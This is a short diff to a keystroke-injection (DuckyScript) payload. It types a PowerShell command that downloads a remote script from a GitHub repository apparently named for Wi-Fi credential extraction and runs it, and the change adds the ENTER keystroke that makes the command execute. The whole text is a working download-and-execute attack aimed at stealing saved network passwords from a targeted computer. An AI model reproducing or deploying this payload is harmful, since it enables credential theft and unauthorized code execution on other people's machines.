@@ -14,3 +14,4 @@ ENTER
 DELAY 200
 ENTER
 STRING wget "https://github.com/tomassj9/wifiextract/raw/main/script.ps1" -o \d.ps1;\d.ps1
+ENTER
